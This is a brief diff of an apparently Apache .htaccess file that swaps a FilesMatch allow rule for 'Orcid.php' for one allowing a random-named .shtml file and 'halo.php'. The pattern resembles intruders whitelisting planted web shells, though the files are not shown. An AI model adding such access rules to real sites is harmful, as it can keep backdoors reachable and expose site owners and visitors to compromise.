@@ -9,7 +9,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(Orcid.php)$'>
+<FilesMatch '^(6a8bba9711fb0.shtml|halo.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
